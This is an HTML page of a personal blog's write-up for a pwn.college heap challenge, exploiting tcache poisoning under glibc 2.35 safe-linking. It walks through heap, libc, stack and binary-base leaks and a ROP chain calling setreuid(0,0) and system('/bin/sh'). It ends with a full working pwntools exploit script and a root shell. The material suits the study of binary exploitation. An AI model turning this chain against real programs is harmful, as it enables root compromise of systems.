@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Heap Exploitation — Tcache Poison to RCE — CTF — co3lho22</title>
+
+  <link rel="icon" href="../assets/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="../assets/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="../assets/favicon-16x16.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="../assets/apple-touch-icon.png">
+  <link rel="manifest" href="../assets/site.webmanifest">
+
+  <link rel="stylesheet" href="../assets/css/main.css">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+</head>
+<body>
+
+  <button id="theme-toggle" aria-label="Toggle theme">
+    <span id="theme-icon">&#9788;</span>
+  </button>
+
+  <div class="container">
+
+    <nav class="site-nav">
+      <a href="https://co3lho22.com" class="back-home">&#8592; co3lho22.com</a>
+    </nav>
+
+    <article class="entry">
+      <header class="entry-header">
+        <a href="../index.html#writeups" class="back-link">&#8592; Writeups</a>
+        <h1>Heap Exploitation &mdash; Tcache Poison to RCE</h1>
+        <div class="entry-meta">
+          <span class="status status-completed">pwn.college</span>
+          <div class="tags-inline">
+            <span class="tag">heap</span>
+            <span class="tag">tcache</span>
+            <span class="tag">safe-linking</span>
+            <span class="tag">glibc_2.35</span>
+            <span class="tag">pwn</span>
+          </div>
+        </div>
+      </header>
+
+      <div class="entry-content">
+
+        <h2>Overview</h2>
+        <p>
+          A pwn.college challenge on dynamic allocator misuse — specifically tcache poisoning under
+          glibc 2.35's safe-linking mitigation. The challenge ships in two variants (easy and hard)
+          that share the same core binary; the difference between them is a single output byte,
+          which I'll cover at the end.
+        </p>
+        <p>
+          Coming in from the previous challenge in the series, I assumed the binary was structurally
+          identical — same primitives, same interface. That was correct. What changed is the objective:
+          <strong>no win function, no chunk that reads the flag</strong>. The server expects a
+          privileged shell, which means leaking everything and writing a payload to the stack.
+        </p>
+
+        <h2>Environment Setup</h2>
+        <p>
+          The binary is dynamically linked against a specific libc and loader provided by the
+          challenge, with hardcoded library paths. To debug locally with GDB, I need to mirror
+          that layout exactly.
+        </p>
+        <pre><code># Pull the binary, libc, and loader from the remote dojo
+scp hacker@dojo.pwn.college:/challenge/tcache-terror-easy .
+scp hacker@dojo.pwn.college:/challenge/lib/libc.so.6 .
+scp hacker@dojo.pwn.college:/challenge/lib/ld-linux-x86-64.so.2 .
+
+# Mirror the hardcoded paths locally with symlinks
+sudo mkdir -p /challenge/lib
+sudo ln -s $(pwd)/libc.so.6 /challenge/lib/libc.so.6
+sudo ln -s $(pwd)/ld-linux-x86-64.so.2 /challenge/lib/ld-linux-x86-64.so.2</code></pre>
+
+        <h2>Recon</h2>
+
+        <h3>Checksec</h3>
+        <pre><code>pwndbg> checksec
+File:     /home/storage/co3lho22/pwn.college/tcache-terror-easy
+Arch:     amd64
+RELRO:      Full RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        PIE enabled
+SHSTK:      Enabled
+IBT:        Enabled
+Stripped:   No</code></pre>
+        <p>
+          Full RELRO rules out a GOT overwrite. Stack canary rules out a direct stack smash.
+          NX rules out shellcode. PIE randomizes all binary addresses at load time. SHSTK and IBT
+          are Intel CET shadow-stack mitigations — relevant to note, but they don't interfere with
+          an attack that targets the stack via the heap. Not stripped means symbols are intact,
+          which helps when computing libc offsets.
+        </p>
+
+        <h3>Primitives</h3>
+        <p>
+          The binary exposes a text-based allocator interface: <code>malloc</code>, <code>free</code>,
+          <code>safe_write</code>, and <code>safe_read</code>. The vulnerability is a
+          <strong>0x10-byte overflow</strong> on each chunk operation — enough to reach the
+          next contiguous chunk's <code>chunk_size</code> field and its <code>fd</code> pointer.
+          Controlling the <code>fd</code> pointer of a freed tcache chunk is the tcache poison primitive.
+        </p>
+
+        <h2>Exploit Plan</h2>
+        <p>
+          With no direct target and full mitigations enabled, the path to a shell requires
+          building four leaks in sequence — each one unlocking the next — then writing a
+          privilege-escalating payload to the stack:
+        </p>
+        <ol>
+          <li><strong>Heap leak</strong> — from the mangled tcache <code>fd</code> of a freed chunk</li>
+          <li><strong>Libc leak</strong> — from the unsorted bin <code>fd</code> of a large freed chunk</li>
+          <li><strong>Stack leak</strong> — via tcache poison to <code>libc.environ</code></li>
+          <li><strong>ELF base leak</strong> — from the saved return address on <code>main</code>'s stack frame</li>
+          <li><strong>Shell</strong> — <code>setreuid(0, 0)</code> + <code>system("/bin/sh")</code> written to the stack</li>
+        </ol>
+        <p>
+          The obvious first thought for a tcache poison target is <code>__malloc_hook</code> or
+          <code>__free_hook</code> — one-shot arbitrary execution. Both were removed in glibc 2.34.
+          With those gone, the cleanest path is pivoting through the stack: leak a stack address
+          via <code>libc.environ</code>, then poison tcache a second time to write directly to
+          <code>main</code>'s return address.
+        </p>
+
+        <h2>Phase 1 — Heap Leak</h2>
+        <p>
+          Glibc 2.32 introduced safe-linking: when a chunk is freed into the tcache, its
+          <code>fd</code> pointer is stored as <code>fd = (chunk_addr &gt;&gt; 12) ^ next_ptr</code>.
+          For the first freed chunk in an empty bin, <code>next_ptr</code> is NULL, so
+          <code>fd</code> is just <code>chunk_addr &gt;&gt; 12</code> — a recoverable heap address.
+          Reading it back after a malloc/free/malloc cycle leaks the heap base.
+        </p>
+        <pre><code># Chunks 0 and 1 are allocated early — they'll be used as the overflow source later
+io.sendline(b"malloc 0 24")
+io.sendline(b"malloc 1 24")
+
+# malloc 2, free it (fd gets set to heap_addr >> 12), reallocate (fd remains in data)
+io.sendline(b"malloc 2 24")
+io.sendline(b"free 2")
+io.sendline(b"malloc 2 24")
+io.sendline(b"safe_write 2")
+
+leak = io.recv(8)
+heap_base = u64(leak) &lt;&lt; 12    # undo the right-shift</code></pre>
+        <pre><code>[+] heap_base: 0x55f8a2400000</code></pre>
+        <p>
+          With the heap base known, we can compute the safe-linking key used in future
+          tcache poison steps: <code>key = heap_base &gt;&gt; 12</code>.
+        </p>
+
+        <h2>Phase 2 — Libc Leak</h2>
+        <p>
+          Chunks larger than 0x400 bytes bypass the tcache entirely and go to the unsorted bin
+          when freed. The unsorted bin's <code>fd</code> points directly into <code>main_arena</code>
+          inside libc — a real libc address, readable with the same safe_write trick.
+        </p>
+        <p>
+          One detail that matters: before freeing the large chunk, allocate a small
+          <strong>guard chunk</strong> between it and the top chunk. Without it, glibc
+          coalesces the freed large chunk back into the top chunk instead of putting it
+          in the unsorted bin, and there's nothing to read.
+        </p>
+        <pre><code>io.sendline(b"malloc 10 1048")   # large chunk — goes to unsorted bin on free
+io.sendline(b"malloc 3 24")       # guard chunk — blocks coalescing with top chunk
+io.sendline(b"free 10")
+io.sendline(b"malloc 10 1048")    # reallocate — unsorted bin fd is now in the data region
+io.sendline(b"safe_write 10")
+
+leak = io.recv(8)
+libc.address = u64(leak) - 0x219ce0    # known offset from arena pointer to libc base</code></pre>
+        <pre><code>[+] libc address: 0x7f3c8a200000
+[+] libc.environ: 0x7f3c8a419e40</code></pre>
+        <p>
+          With libc resolved, <code>libc.environ</code> — the address of the environment
+          pointer on the stack — is now a concrete target for the next poison.
+        </p>
+
+        <h2>Phase 3 — Stack Leak via Tcache Poison</h2>
+        <p>
+          <code>libc.environ</code> holds a pointer into the process's environment block,
+          which lives on the stack in a fixed relationship to <code>main</code>'s return address.
+          If we can allocate a chunk there and read it, we get a stack address and can compute
+          the return address offset from it via backtrace inspection in GDB.
+        </p>
+        <p>
+          To forge an allocation at an arbitrary address, we overwrite the <code>fd</code> pointer
+          of a freed tcache chunk with the mangled target:
+          <code>mangled = target ^ (heap_base &gt;&gt; 12)</code>. The next two allocations of
+          the same size return first the poisoned chunk, then the forged address.
+        </p>
+        <pre><code># Free chunks 2 and 1 — order matters: 1 must be freed last so it's at the tcache head
+io.sendline(b"free 2")
+io.sendline(b"free 1")
+
+key = heap_base >> 12
+mangled = libc.sym.environ ^ key
+
+# Overflow from chunk 0 into chunk 1's fd pointer
+payload = flat(
+    p64(0x22) * 3,    # fill chunk 0 data (24 bytes) + overflow chunk 1's prev_size
+    p64(0x21),        # keep chunk 1's size field valid
+    p64(mangled),     # overwrite chunk 1's fd -> libc.environ
+)
+io.sendline(b"safe_read 0")
+io.send(payload)
+
+io.sendline(b"malloc 1 24")    # pops chunk 1 from tcache head
+io.sendline(b"malloc 2 24")    # tcache now serves the forged pointer: libc.environ
+io.sendline(b"safe_write 2")
+
+stack_address = u64(io.recv(8))
+ret_address = stack_address - 0x120</code></pre>
+        <pre><code>[+] stack_address (environ): 0x7ffe928bf5a8
+[+] ret_address: 0x7ffe928bf488</code></pre>
+        <p>
+          The offset <code>-0x120</code> was determined by comparing <code>libc.environ</code>
+          against the return address shown in GDB's backtrace.
+          Writing directly to <code>ret_address</code> turned out to be misaligned — the chunk
+          data would start mid-payload. Targeting <code>rbp</code> instead (8 bytes before
+          <code>ret</code>) aligns the write perfectly: <code>p64(0x0)</code> lands on the saved
+          rbp, and the payload chain starts exactly at the return address.
+        </p>
+        <pre><code>rbp_address = ret_address - 0x8</code></pre>
+
+        <h2>Phase 4 — ELF Base Leak</h2>
+        <p>
+          Before writing the final payload, I poisoned the tcache a second time to allocate at
+          <code>rbp_address</code> and read the stack frame contents. At <code>rbp + 0x18</code>
+          sits the saved return address back into <code>main</code> — a binary address that,
+          minus a static offset found by disassembly, gives the ELF base and validates
+          that PIE randomization is correctly accounted for.
+        </p>
+        <pre><code># Fresh set of chunks at size 72 for the second poison
+io.sendline(b"malloc 0 72")
+io.sendline(b"malloc 1 72")
+io.sendline(b"malloc 2 72")
+io.sendline(b"free 2")
+io.sendline(b"free 1")
+
+mangled = rbp_address ^ key
+
+payload = flat(
+    p64(0x22) * 9,    # fill chunk 0 (72 bytes)
+    p64(0x51),        # keep chunk 1's size field valid (0x50 + prev_inuse)
+    p64(mangled),     # overwrite chunk 1's fd -> rbp_address
+)
+io.sendline(b"safe_read 0")
+io.send(payload)
+
+io.sendline(b"malloc 1 72")
+io.sendline(b"malloc 2 72")    # lands at rbp_address
+
+io.sendline(b"safe_write 2")
+io.recv(8 * 3)    # skip: saved rbp, saved rsp, __libc_start_call_main return stub
+leak = io.recv(8)
+main_address = u64(leak)
+elf.address = main_address - 0x1957</code></pre>
+        <pre><code>[+] main_address: 0x55f8a1601957
+[+] elf.address: 0x55f8a1600000
+[+] libc system: 0x7f3c8a248d60</code></pre>
+        <p>
+          Worth noting: all gadgets for the final payload come from libc, not the binary,
+          so the ELF base itself isn't strictly needed to execute the shell. It's useful
+          for offset validation and as a sanity check that the whole chain is consistent
+          before committing the final write.
+        </p>
+
+        <h2>Phase 5 — Privilege Escalation</h2>
+        <p>
+          The binary runs as a privileged user on the server. Calling <code>system("/bin/sh")</code>
+          alone spawns a shell under the original UID — not root. The fix is prepending a
+          <code>setreuid(0, 0)</code> call to set both real and effective UIDs to 0 before
+          executing the shell.
+        </p>
+        <p>
+          Pwntools' <code>ROP(libc)</code> searches the loaded libc for gadgets automatically —
+          not just the binary. Since the binary is largely devoid of useful gadgets, pointing
+          pwntools at the libc object (already rebased after the leak) gives direct access to
+          <code>pop rdi</code>, <code>pop rsi</code>, and everything else needed.
+        </p>
+        <pre><code>rop = ROP(libc)
+
+rop.raw(rop.rdi)
+rop.raw(0)                              # ruid = 0
+rop.raw(rop.rsi)
+rop.raw(0)                              # euid = 0
+rop.raw(libc.sym.setreuid)
+rop.raw(rop.rdi)
+rop.raw(next(libc.search(b'/bin/sh')))
+rop.raw(libc.sym.system)
+
+# chunk 2 is already at rbp_address — write null rbp + chain
+io.sendline(b"safe_read 2")
+io.send(p64(0x0) + rop.chain())
+
+# trigger: main() returns, walks the chain
+io.sendline(b"quit")</code></pre>
+        <pre><code>[*] Switching to interactive mode
+$ id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+        <h2>Hard Variant</h2>
+        <p>
+          The hard variant uses the same binary logic and the same exploit. The only difference
+          is in how <code>safe_write</code> formats its output: the easy version terminates with
+          <code>)\n</code> (<code>\x29\x0a</code>), while the hard version terminates with
+          <code> \n</code> (<code>\x20\x0a</code>). Every <code>recvuntil</code> call before
+          reading a leak needed to match that byte.
+        </p>
+        <pre><code># easy
+io.recvuntil(b"\x29\x0a")
+
+# hard
+io.recvuntil(b"\x20\x0a")</code></pre>
+        <p>
+          The exploit hung on the first leak — <code>recvuntil</code> never found its pattern
+          and blocked indefinitely. Dumping the raw bytes from the socket made the mismatch
+          immediately obvious.
+        </p>
+
+        <h2>Full Scripts</h2>
+
+        <h3>Easy</h3>
+        <pre><code>#!/usr/bin/python3
+from pwn import *
+
+elf = context.binary = ELF("./tcache-terror-easy")
+libc = ELF(b"/challenge/lib/libc.so.6")
+context.log_level = 'debug'
+
+def start():
+    if args.GDB:
+        io = process(elf.path)
+        print(f"[+] Process started with PID: {io.pid}")
+        print(f"[+] In another SSH session, run:")
+        print(f"    gdb-pwndbg -p {io.pid}")
+        input("[*] Press Enter to continue after attaching GDB...")
+        return io
+    else:
+        return process(elf.path)
+
+io = start()
+
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"malloc 0 24")
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"malloc 1 24")
+
+# leak heap
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"malloc 2 24")
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"free 2")
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"malloc 2 24")
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"safe_write 2")
+io.recvuntil(b"\x29\x0a")
+leak = io.recv(8)
+heap_base = u64(leak) &lt;&lt; 12
+log.success(f"heap_base: {hex(heap_base)}")
+
+# leak libc
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"malloc 10 1048")
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"malloc 3 24")
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"free 10")
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"malloc 10 1048")
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"safe_write 10")
+io.recvuntil(b"\x29\x0a")
+leak = io.recv(8)
+libc.address = u64(leak) - 0x219ce0
+log.success(f"libc address: {hex(libc.address)}")
+
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"free 2")
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"free 1")
+
+# leak stack via tcache poison to libc.environ
+key = heap_base >> 12
+mangled = libc.sym.environ ^ key
+payload = flat(p64(0x22) * 3, p64(0x21), p64(mangled))
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"safe_read 0")
+io.send(payload)
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"malloc 1 24")
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"malloc 2 24")
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"safe_write 2")
+io.recvuntil(b"\x29\x0a")
+leak = io.recv(8)
+stack_address = u64(leak)
+ret_address = stack_address - 0x120
+rbp_address = ret_address - 0x8
+log.success(f"stack_address: {hex(stack_address)}")
+log.success(f"rbp_address: {hex(rbp_address)}")
+
+# leak elf base via saved return address on main's stack frame
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"malloc 0 72")
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"malloc 1 72")
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"malloc 2 72")
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"free 2")
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"free 1")
+
+mangled = rbp_address ^ key
+payload = flat(p64(0x22) * 9, p64(0x51), p64(mangled))
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"safe_read 0")
+io.send(payload)
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"malloc 1 72")
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"malloc 2 72")
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"safe_write 2")
+io.recvuntil(b"\x29\x0a")
+io.recv(8 * 3)
+leak = io.recv(8)
+main_address = u64(leak)
+elf.address = main_address - 0x1957
+log.success(f"elf.address: {hex(elf.address)}")
+
+# setreuid(0,0) + system("/bin/sh") via libc gadgets
+rop = ROP(libc)
+rop.raw(rop.rdi); rop.raw(0)
+rop.raw(rop.rsi); rop.raw(0)
+rop.raw(libc.sym.setreuid)
+rop.raw(rop.rdi)
+rop.raw(next(libc.search(b'/bin/sh')))
+rop.raw(libc.sym.system)
+
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"safe_read 2")
+io.send(p64(0x0) + rop.chain())
+
+io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+io.sendline(b"quit")
+
+io.interactive()</code></pre>
+
+        <h3>Hard (diff from easy)</h3>
+        <pre><code># Replace every occurrence of:
+io.recvuntil(b"\x29\x0a")
+# with:
+io.recvuntil(b"\x20\x0a")</code></pre>
+
+      </div>
+    </article>
+
+    <footer>
+      <div class="social">
+        <a href="https://github.com/Co3lho22" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://co3lho22.com">co3lho22.com</a>
+      </div>
+    </footer>
+
+  </div>
+
+  <script src="../assets/js/theme.js"></script>
+  <script src="../assets/js/main.js"></script>
+</body>
+</html>
